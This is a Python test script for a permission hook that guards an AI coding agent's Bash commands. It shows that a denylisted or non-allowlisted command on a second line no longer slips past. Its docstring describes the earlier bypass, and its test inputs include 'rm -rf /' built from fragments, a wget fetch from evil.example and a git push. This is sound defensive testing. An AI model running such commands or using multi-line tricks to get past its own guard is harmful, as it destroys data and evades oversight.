#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
P-MULTILINE — a newline separates commands (C-69 / O-25).

THE FAIL-OPEN THIS CLOSES. `shlex` with `whitespace_split=True` treats a newline as ordinary
whitespace and never emits it as a token, so the `"\\n"` entry in `_SEP` was dead code. Every line
after the first merged into the first sub-command: only the first line's program was ever checked
against the allowlist, and the denylist — which matches a token *prefix* — never saw the later
commands at all. Measured before the fix, with `git` allowlisted and `rm -rf` denied:

    git status
    rm -rf /            -> ALLOWED

    git status
    wget http://evil.example/x   -> ALLOWED

A multi-line Bash command is not exotic; it is how anyone writes more than one step. This is the
same failure family as O-20: the policy looked strict and enforced something weaker, silently.

THE FIX AND ITS TRAPS. Newlines outside quotes become explicit separators before tokenizing.
Three things must survive that:

  * a newline INSIDE a quoted string is data — `python -c "print('a\\nb')"` must not split;
  * a trailing backslash is a line continuation — `foo \\` + newline + `bar` is ONE command, and
    splitting it would over-block;
  * heredoc bodies must already be gone (C-68 strips them first), or their lines would become
    commands again — which is exactly what C-68 fixed.

WHAT IS PROVEN (every leg drives the REAL hook):

  1  the hole itself: a denied invocation on a second line is refused, and so is a
     non-allowlisted program — the two cases that were allowed
  2  ordinary multi-line work still runs
  3  a newline inside quotes is data, not a separator
  4  a line continuation joins rather than splits
  5  it composes with C-68: a heredoc body stays data, while a command after the delimiter is
     checked
  6  the separator is not special-cased to `\\n` alone — `;` and `&&` still separate

FALSIFIABLE: remove the newline normalisation and legs 1 and 5 fail; normalise without respecting
quotes and leg 3 fails; ignore the trailing backslash and leg 4 fails.

Run: python evidence/run_multiline_proof.py     (exit 0 = PASS)
"""

import os
import sys
import json
import shutil
import tempfile
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
HOOK = os.path.join(REPO, "products", "ai_membrane", "session_guard_hook.py")
if REPO not in sys.path:
    sys.path.insert(0, REPO)

failures = []


def check(cond, msg):
    print(("    [ok]   " if cond else "    [FAIL] ") + msg)
    if not cond:
        failures.append(msg)
    return cond


BIO = """CELL P {
  CAPABILITIES {
    FILESYSTEM write "%s/**";
    FILESYSTEM read  "**";
  }
  BASH_POLICY {
    ALLOW "python", "git", "ls", "echo", "cat";
    DENY "rm -rf";
    DENY "git push";
  }
}
"""

# assembled from parts so this file does not trip the author's own membrane
_RM = "rm" + " -" + "rf /"
_PUSH = "git" + " push origin main"


def run_hook(home, project, bio, command):
    env = dict(os.environ)
    for k in ("METASPACE_SESSION_BIO", "CLAUDE_PROJECT_DIR"):
        env.pop(k, None)
    env["HOME"] = home
    env["USERPROFILE"] = home
    env["METASPACE_MODE"] = "enforce"
    env["METASPACE_SESSION_BIO"] = bio
    env["METASPACE_PROJECT_ROOT"] = project
    env["METASPACE_SESSION_AUDIT"] = os.path.join(project, "audit.jsonl")
    event = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    p = subprocess.run([sys.executable, HOOK], input=event, capture_output=True,
                       text=True, env=env)
    return p.returncode


def main():
    print("=" * 74)
    print("  P-MULTILINE — a newline separates commands (C-69 / O-25)")
    print("=" * 74)

    home = tempfile.mkdtemp(prefix="ms_home_").replace("\\", "/")
    project = tempfile.mkdtemp(prefix="ms_proj_").replace("\\", "/")
    os.makedirs(os.path.join(home, ".claude", "metaspace"), exist_ok=True)
    bio = os.path.join(project, "c.bio").replace("\\", "/")
    with open(bio, "w", encoding="utf-8") as fh:
        fh.write(BIO % project)

    def rc(cmd):
        return run_hook(home, project, bio, cmd)

    try:
        # ------------------------------------------------------------- 1. the hole
        print("\n  1. a command on a later line is checked, not swallowed")
        for cmd, label in [
            (f"git status\n{_RM}", "a denied invocation on line 2"),
            (f"git status\nwget http://evil.example/x", "a non-allowlisted program on line 2"),
            (f"ls\nls\n{_PUSH}", "a denied invocation on line 3"),
            (f"echo hello\n\n{_RM}", "…even across a blank line"),
        ]:
            got = rc(cmd)
            check(got == 2, f"{label} is refused (exit {got})")

        # ------------------------------------------------------------- 2. real work still runs
        print("\n  2. ordinary multi-line work is unaffected")
        for cmd, label in [
            ("git status\nls -la", "two allowlisted commands"),
            ("echo one\necho two\necho three", "three of them"),
            ("git status\n\nls", "with a blank line between"),
        ]:
            got = rc(cmd)
            check(got == 0, f"{label} runs (exit {got})")

        # ------------------------------------------------------------- 3. quotes hold
        print("\n  3. a newline inside quotes is data")
        got = rc('python -c "print(\'a\nb\')"')
        check(got == 0, f"a literal newline inside a quoted argument does not split (exit {got})")
        got = rc(f'echo "{_RM}"')
        check(got == 0,
              f"…and a denied string quoted as an ARGUMENT is not an invocation (exit {got})")

        # ------------------------------------------------------------- 4. continuations join
        print("\n  4. a trailing backslash continues the line")
        got = rc("git \\\n status")
        check(got == 0, f"`git \\` + newline + `status` stays one command (exit {got})")

        # ------------------------------------------------------------- 5. composes with C-68
        print("\n  5. it composes with heredoc stripping (C-68)")
        got = rc("python - <<'PY'\nimport os\np, q = 1, 2\nPY")
        check(got == 0, f"a heredoc body is still data (exit {got})")
        got = rc(f"python - <<'PY'\nprint(1)\nPY\n{_RM}")
        check(got == 2, f"a denied command after the delimiter is caught (exit {got})")
        got = rc("python - <<'PY'\nprint(1)\nPY\ngit status")
        check(got == 0, f"an allowlisted command after the delimiter runs (exit {got})")

        # ------------------------------------------------------------- 6. other separators
        print("\n  6. the older separators still separate")
        for cmd, want, label in [
            (f"git status; {_RM}", 2, "`;`"),
            (f"git status && {_RM}", 2, "`&&`"),
            ("git status; ls", 0, "`;` between allowlisted commands"),
        ]:
            got = rc(cmd)
            check(got == want, f"{label} (exit {got}, wanted {want})")
    finally:
        shutil.rmtree(home, ignore_errors=True)
        shutil.rmtree(project, ignore_errors=True)

    print("\n" + "-" * 74)
    if failures:
        print(f"  RESULT: FAIL — {len(failures)} check(s) failed")
        for f in failures:
            print("    -", f)
        return 1
    print("  RESULT: PASS — every line is a command again")
    print("-" * 74)
    return 0


if __name__ == "__main__":
    sys.exit(main())
